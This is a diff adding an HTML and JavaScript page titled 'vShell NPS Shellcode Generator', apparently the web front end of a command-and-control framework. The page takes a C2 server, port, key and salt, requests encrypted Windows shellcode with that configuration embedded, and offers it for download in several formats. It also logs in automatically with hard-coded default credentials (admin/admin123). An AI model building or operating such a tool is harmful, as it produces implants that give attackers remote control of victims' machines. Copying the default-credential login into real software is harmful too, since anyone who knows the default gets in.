@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vShell NPS Shellcode Generator</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;background:#0d1117;color:#c9d1d9;font-family:-apple-system,'Segoe UI','Helvetica Neue',Arial,sans-serif;font-size:14px}
+.wrapper{display:flex;flex-direction:column;height:100vh}
+.header{display:flex;align-items:center;padding:12px 20px;background:#161b22;border-bottom:1px solid #30363d;flex-shrink:0;gap:12px}
+.header .title{font-size:15px;font-weight:600;color:#e6edf3}
+.header .subtitle{font-size:12px;color:#8b949e}
+.main{flex:1;overflow-y:auto;padding:20px;max-width:720px;margin:0 auto;width:100%}
+.form-group{margin-bottom:18px}
+.form-group label{display:block;font-size:12px;font-weight:600;color:#8b949e;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.form-group .hint{font-size:11px;color:#484f58;margin-top:2px}
+.form-row{display:flex;gap:12px}
+.form-row .form-group{flex:1}
+input[type=text],input[type=number],select{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:14px;font-family:'Cascadia Code','Fira Code',monospace;outline:none;transition:border-color .15s}
+input:focus,select:focus{border-color:#58a6ff}
+input::placeholder{color:#484f58}
+select{cursor:pointer}
+select option{background:#161b22;color:#c9d1d9}
+.radio-group{display:flex;gap:8px;flex-wrap:wrap}
+.radio-group label{all:unset;display:inline-flex;align-items:center;gap:6px;padding:6px 14px;background:#0d1117;border:1px solid #30363d;border-radius:6px;cursor:pointer;font-size:13px;color:#c9d1d9;transition:all .15s}
+.radio-group label:hover{border-color:#8b949e}
+.radio-group input[type=radio]{display:none}
+.radio-group input[type=radio]:checked+span{color:#58a6ff}
+.radio-group input[type=radio]:checked ~ .label-text{color:#58a6ff}
+.radio-group label:has(input:checked){border-color:#58a6ff;background:#1c2433}
+.actions{display:flex;gap:10px;margin-top:24px;padding-top:16px;border-top:1px solid #21262d}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 20px;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;border:1px solid transparent;transition:all .15s;font-family:inherit}
+.btn-primary{background:#238636;border-color:#238636;color:#fff}
+.btn-primary:hover{background:#2ea043}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed}
+.btn-secondary{background:#21262d;border-color:#30363d;color:#c9d1d9}
+.btn-secondary:hover{background:#30363d}
+.btn-danger{background:#21262d;border-color:#30363d;color:#f85149}
+.btn-danger:hover{background:#f8514911;border-color:#f85149}
+.output-area{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;margin-top:16px;display:none;font-family:'Cascadia Code','Fira Code',monospace;font-size:12px;line-height:1.5;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+.output-area.show{display:block}
+.status-bar{flex-shrink:0;padding:6px 20px;font-size:11px;color:#484f58;border-top:1px solid #21262d;display:flex;justify-content:space-between}
+.status-bar .dot{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:4px}
+.status-bar .dot.online{background:#3fb950}
+.status-bar .dot.offline{background:#f85149}
+.loading{display:inline-block;width:14px;height:14px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.result-info{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin-top:12px;display:none}
+.result-info.show{display:block}
+.result-info .row{display:flex;justify-content:space-between;padding:3px 0;font-size:12px}
+.result-info .row .label{color:#8b949e}
+.result-info .row .value{color:#e6edf3;font-family:monospace}
+#rawShellcode{width:100%;min-height:80px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:4px;font-family:monospace;font-size:11px;resize:vertical}
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="header">
+    <div class="title">NPS Shellcode Generator</div>
+    <div class="subtitle">Generate encrypted shellcode with embedded C2 configuration</div>
+  </div>
+
+  <div class="main">
+    <div class="form-row">
+      <div class="form-group">
+        <label>C2 Server</label>
+        <input id="server" type="text" value="127.0.0.1" placeholder="C2 server IP or domain">
+        <div class="hint">当前服务器: <span id="currentIP">检测中...</span></div>
+      </div>
+      <div class="form-group">
+        <label>Agent Port</label>
+        <input id="port" type="number" value="8084" min="1" max="65535">
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>Vkey</label>
+        <input id="vkey" type="text" value="vshell-key" placeholder="Authentication key">
+      </div>
+      <div class="form-group">
+        <label>Salt</label>
+        <input id="salt" type="text" value="vshell-salt" placeholder="Encryption salt">
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>Architecture</label>
+      <select id="arch">
+        <option value="windows_amd64">Windows x64 (AMD64)</option>
+        <option value="windows_i386">Windows x86 (I386)</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label>Output Format</label>
+      <div class="radio-group">
+        <label><input type="radio" name="format" value="bin" checked><span class="label-text">.bin (raw)</span></label>
+        <label><input type="radio" name="format" value="c"><span class="label-text">.c (C array)</span></label>
+        <label><input type="radio" name="format" value="raw"><span class="label-text">JSON (base64)</span></label>
+        <label><input type="radio" name="format" value="xfc"><span class="label-text">.xfc (hex \x format)</span></label>
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn btn-primary" id="genBtn" onclick="generate()">Generate Shellcode</button>
+      <button class="btn btn-secondary" onclick="resetForm()">Reset</button>
+    </div>
+
+    <div class="result-info" id="resultInfo"></div>
+    <div class="output-area" id="outputArea"></div>
+  </div>
+
+  <div class="status-bar">
+    <span><span class="dot online" id="statusDot"></span><span id="statusText">Ready</span></span>
+    <span id="hintText">AES-GCM encrypted NPS protocol shellcode</span>
+  </div>
+</div>
+
+<script>
+var TOKEN = location.href.includes('token=')
+  ? new URLSearchParams(location.search).get('token')
+  : localStorage.getItem('TOKEN__') || '';
+
+// If no token, try login with default credentials
+async function ensureToken() {
+  if (TOKEN) return TOKEN;
+  try {
+    const resp = await fetch('/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({username:'admin', password:'admin123'})
+    });
+    const data = await resp.json();
+    if (data.success && data.result) {
+      TOKEN = data.result.token || data.result;
+      localStorage.setItem('TOKEN__', TOKEN);
+    }
+  } catch(e) {
+    console.error('Login failed:', e);
+  }
+  return TOKEN;
+}
+
+function getApiUrl(path) {
+  return path;
+}
+
+async function generate() {
+  const server = document.getElementById('server').value.trim();
+  const port = document.getElementById('port').value;
+  const vkey = document.getElementById('vkey').value.trim();
+  const salt = document.getElementById('salt').value.trim();
+  const arch = document.getElementById('arch').value;
+  const format = document.querySelector('input[name="format"]:checked').value;
+  const btn = document.getElementById('genBtn');
+
+  if (!server) { alert('Server address is required'); return; }
+  if (!port || port < 1) { alert('Valid port is required'); return; }
+
+  // Build URL
+  const params = new URLSearchParams({
+    server, port, vkey, salt, arch, format
+  });
+  const url = '/api/shellcode/nps?' + params.toString();
+
+  // Disable button, show status
+  btn.disabled = true;
+  btn.textContent = ' Generating...';
+  setStatus('Generating shellcode...', 'loading');
+  hideOutput();
+  hideResult();
+
+  try {
+    await ensureToken();
+    const headers = {};
+    if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
+
+    const response = await fetch(url, { headers });
+
+    if (!response.ok) {
+      const errText = await response.text();
+      throw new Error(errText || `HTTP ${response.status}`);
+    }
+
+    const contentType = response.headers.get('Content-Type') || '';
+
+    if (contentType.includes('application/octet-stream') || contentType.includes('text/plain')) {
+      // Binary or C format - download as file
+      const blob = await response.blob();
+      const disposition = response.headers.get('Content-Disposition') || '';
+      let filename = `vshell_nps_${arch}_${server}.${format}`;
+      const match = disposition.match(/filename="?([^"]+)"?/);
+      if (match) filename = match[1];
+
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = filename;
+      a.click();
+      URL.revokeObjectURL(a.href);
+
+      const size = blob.size;
+      showResult([
+        {label:'Status', value:'Downloaded'},
+        {label:'File', value:filename},
+        {label:'Size', value:size + ' bytes'},
+        {label:'Arch', value:arch},
+        {label:'Config', value:`${server}:${port} vkey=${vkey}`}
+      ]);
+      setStatus('Shellcode generated and downloaded', 'success');
+    } else {
+      // JSON response with base64 shellcode
+      const data = await response.json();
+      if (data.success) {
+        showResult([
+          {label:'Status', value:'Generated'},
+          {label:'Arch', value:data.arch || arch},
+          {label:'Format', value:data.format || format},
+          {label:'Size', value:(data.size || 0) + ' bytes'},
+          {label:'Config', value:`${data.server||server}:${data.port||port}`}
+        ]);
+        if (data.shellcode) {
+          showOutput('Base64 Shellcode:\n' + data.shellcode);
+        }
+        setStatus('Shellcode generated', 'success');
+      } else {
+        throw new Error(data.message || 'Generation failed');
+      }
+    }
+  } catch (err) {
+    showOutput('Error: ' + err.message);
+    setStatus('Error: ' + err.message, 'error');
+  }
+
+  btn.disabled = false;
+  btn.textContent = 'Generate Shellcode';
+}
+
+function setStatus(text, type) {
+  const dot = document.getElementById('statusDot');
+  const statusText = document.getElementById('statusText');
+  statusText.textContent = text;
+  dot.className = 'dot';
+  if (type === 'loading') {
+    statusText.innerHTML = '<span class="loading"></span> ' + text;
+    dot.classList.add('online');
+  } else if (type === 'error') {
+    dot.classList.add('offline');
+  } else {
+    dot.classList.add('online');
+  }
+}
+
+function showResult(rows) {
+  const el = document.getElementById('resultInfo');
+  el.innerHTML = rows.map(r => `<div class="row"><span class="label">${r.label}</span><span class="value">${r.value}</span></div>`).join('');
+  el.classList.add('show');
+}
+
+function hideResult() {
+  document.getElementById('resultInfo').classList.remove('show');
+}
+
+function showOutput(text) {
+  const el = document.getElementById('outputArea');
+  el.textContent = text;
+  el.classList.add('show');
+}
+
+function hideOutput() {
+  document.getElementById('outputArea').classList.remove('show');
+}
+
+function resetForm() {
+  document.getElementById('server').value = location.hostname || '127.0.0.1';
+  document.getElementById('port').value = location.port || '8084';
+  document.getElementById('vkey').value = 'vshell-key';
+  document.getElementById('salt').value = 'vshell-salt';
+  hideOutput();
+  hideResult();
+  setStatus('Ready', 'ready');
+}
+
+// Auto-fill server IP and port from current page hostname
+(function autoFillServer() {
+  const ipEl = document.getElementById('currentIP');
+  const serverEl = document.getElementById('server');
+  const portEl = document.getElementById('port');
+  if (ipEl) {
+    const host = location.hostname;
+    const port = location.port;
+    ipEl.textContent = host;
+    if (host !== '127.0.0.1' && host !== 'localhost' && host !== '0.0.0.0') {
+      serverEl.value = host;
+    }
+    if (port && port !== '') {
+      portEl.value = port;
+    }
+  }
+})();
+
+// Enter key to generate
+document.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !e.ctrlKey && !e.metaKey) generate();
+});
+</script>
+</body>
+</html>
